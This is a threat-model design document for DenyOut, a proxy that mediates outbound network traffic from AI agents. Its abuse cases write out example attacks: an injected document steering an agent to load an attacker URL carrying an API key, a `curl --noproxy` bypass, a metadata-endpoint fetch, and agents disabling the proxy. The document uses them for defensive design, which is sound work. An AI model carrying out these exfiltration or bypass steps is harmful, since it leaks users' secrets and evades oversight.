# D02 - Threat model

## 1. Scope

This threat model covers **DenyOut as an egress mediation layer** for AI agents on developer workstations and server workloads. It does not cover compromising the LLM weights, the user's browser outside DenyOut, or physical access.

## 2. Assets

| Asset | Sensitivity | Notes |
| --- | --- | --- |
| Secrets in agent environment / workspace | Critical | API keys, tokens, `.env`, cloud creds |
| Customer / private data in context | Critical | RAG chunks, tickets, source |
| Model provider credentials | High | Often still in env in MVP |
| DenyOut policy & allowlist | High | Weakening = expand blast radius |
| DenyOut local CA private key | Critical | Enables silent MITM of child traffic |
| Audit log integrity | High | Incident response depends on it |
| Canary markers | Medium | Detection integrity |

## 3. Actors

| Actor | Capability | Goal |
| --- | --- | --- |
| **A1 Prompt injector** | Controls untrusted content the agent reads | Exfiltrate secrets / coerce tool use |
| **A2 Malicious tool / MCP server** | Returns poisoned tool output or descriptions | Steer agent to bad URLs / args |
| **A3 Compromised dependency** | Code execution in agent process | Direct socket exfil, disable proxy env |
| **A4 Curious / careless user** | Runs agent with broad tools | Accidental leak. Wants low friction |
| **A5 Malicious insider ops** | Can edit server policy | Expand allowlist stealthily |
| **A6 Network attacker** | On-path on public Wi‑Fi | Less relevant if TLS to real destinations. Relevant if user installs attacker CA |

## 4. Trust boundaries

```text
┌─────────────────────────────────────────────┐
│ User / orchestrator (starts denyout) │
└─────────────────────┬───────────────────────┘
 │ spawns
 ▼
┌─────────────────────────────────────────────┐
│ DenyOut (policy + proxy + audit writer) │ TRUSTED relative to agent
│ - reads policy from disk / configmap │
│ - holds CA key (intercept) │
│ - writes audit outside agent FS when possible │
└─────────────────────┬───────────────────────┘
 │ mediates
 ▼
┌─────────────────────────────────────────────┐
│ Agent process tree (UNTRUSTED) │
│ - LLM, tools, shell, MCP, browser tool │
└─────────────────────┬───────────────────────┘
 │ only via DenyOut (ideal)
 ▼
┌─────────────────────────────────────────────┐
│ External network / internal APIs │
└─────────────────────────────────────────────┘
```

**Assumption MVP desktop:** Agent is not actively malicious malware with root. It is a confused/steered process. Env-based proxy can be ignored by some binaries -> residual risk (D10).

**Assumption server:** NetworkPolicy/firewall makes non-proxy egress impossible. Then ignoring `HTTPS_PROXY` fails closed.

## 5. Mapping to Arviser risks

| Risk | DenyOut role |
| --- | --- |
| **R-20** answer/link/image exfil | **Primary** - block secret URLs. Deny unknown hosts. Stop auto-fetch to attacker |
| **R-01** injection steering tools | **Partial** - limits blast radius of network tools |
| **R-04** secrets in answers | **Partial** - if secret appears in outbound URL/headers |
| **R-09** excessive agency | **Partial** - outbound side only |
| **R-11** unexpected network from code | **Partial** - if traffic uses proxy / is fenced |
| **R-16** runaway agent | **Partial** - rate limits + kill switch |
| **R-25** cost explosion | **Partial** - outbound call budgets |

Not in scope as primary: R-05 tenancy, R-19 training poison, R-26 deletion, etc.

## 6. Abuse cases (detailed)

### T-EXFIL-URL (R-20)

**Story:** Injected doc tells agent to "verify" by loading 
`https://attacker.tld/c.png?k=<API_KEY>`.

**DenyOut:** 
- Host not on allowlist -> deny in `enforce`. 
- Even if host allowed (e.g. open CDN mistake), secret scanner on query -> deny. 
- Audit reason: `host_not_allowed` or `secret_in_url`.

### T-EXFIL-IMG-AUTOLOAD

**Story:** Chat UI or ticket renderer loads markdown image without click.

**DenyOut:** Same as HTTP GET through proxy if the rendering process is under DenyOut. 
**Gap:** If the **human's browser** outside DenyOut renders the image, DenyOut does not see it. Mitigation: product guidance + optional browser extension later. For agents, wrap the **browser tool** process.

### T-EXFIL-DNS

**Story:** Agent encodes secret in DNS labels when HTTPS is blocked.

**DenyOut MVP:** SHOULD document. MAY block external DNS from workload (server: DNS only to internal resolver that logs/filters). Desktop MVP: often unresolved without OS sandbox. Tracked as phase 2+.

### T-EXFIL-ALLOWED-HOST

**Story:** Allowlist includes `api.telegram.org` or a paste host. Agent POSTs secret in body.

**DenyOut:** With **passthrough** TLS, body invisible -> gap. With **intercept** + body scanner / DLP rules -> best-effort deny. Policy SHOULD prefer narrow path/method allowlists (phase 2).

### T-PROXY-BYPASS

**Story:** Agent runs `curl --noproxy '*' https://evil` or raw socket.

**Desktop MVP:** Often succeeds unless OS sandbox. Spec **MUST** document. 
**Server:** NetworkPolicy deny -> connection fails. Acceptance test mandatory (D14).

### T-DISABLE-DENYOUT

**Story:** Agent rewrites `~/.bashrc` or kills proxy.

**Desktop:** User-equivalent agent can often do this. DenyOut is seatbelt not rootkit. 
**Server:** Agent has no permission to edit ConfigMap / kill sibling with PDB + non-shared service account.

### T-POLICY-WEAKEN

**Story:** Attacker who can write policy adds `*.herokuapp.com`.

**Mitigation:** GitOps, signed policy (phase 2), audit on policy reload, least privilege on policy volume.

### T-CA-THEFT

**Story:** Malware steals DenyOut CA key, MITMs other apps.

**Mitigation:** CA only for child trust store. Desktop CA not installed system-wide by default. File perms 0600. Server CA in memory / tmpfs. Rotate on restart option.

### T-SSRF-METADATA

**Story:** Agent fetches `http://169.254.169.254/`.

**DenyOut MUST** deny link-local / metadata ranges by default (D04).

### T-LOOPHOLE-REDIRECT

**Story:** Allowed host 302-redirects to evil with secret in Location follow.

**Intercept mode SHOULD** re-evaluate policy on redirect targets. Passthrough: limited. Document.

## 7. STRIDE-style summary

| Category | Examples | Control |
| --- | --- | --- |
| Spoofing | Fake upstream | TLS to real hosts. Optional cert pinning later |
| Tampering | Agent edits audit log | Write audit outside agent mount |
| Repudiation | "We didn't call evil" | Signed/hash-chained audit (phase 2). MVP structured logs |
| Info disclosure | Secret in URL | Scanners. Deny |
| DoS | Agent floods egress | Rate limits. Connection caps |
| Elevation | Agent becomes broader network user | Allowlist + no standing "*". Ask mode |

## 8. Residual risks (accepted for MVP)

1. Desktop proxy-env bypass without OS fence. 
2. Exfil to allowed host via encrypted body without intercept DLP. 
3. Human browser rendering agent output outside DenyOut. 
4. User explicitly allowlisting attacker infrastructure. 
5. Compromise of the DenyOut process itself (= game over for egress confidentiality/integrity).

## 9. Security objectives (CIA for egress path)

| Objective | Requirement |
| --- | --- |
| Confidentiality | Secrets MUST NOT leave via denied destinations. SHOULD NOT leave via URL even to allowed destinations |
| Integrity | Policy evaluation MUST be deterministic given config + request view |
| Availability | DenyOut crash MUST fail closed for server deployments. Desktop SHOULD leave clear error (agent without net) |

## 10. Data DenyOut itself processes

| Data | Retention default |
| --- | --- |
| Destination host, method, path | Audit (configurable retention) |
| Query string | Redact secrets before disk. Or hash. Default **redact matched spans** |
| Headers | Log names. Values redacted unless `audit.include_headers=true` (dangerous) |
| Body | Not logged by default. Scanners run in memory |
| User content / prompts | Not parsed by MVP proxy |

**Privacy stance:** local-first. No cloud phoning home in OSS default.
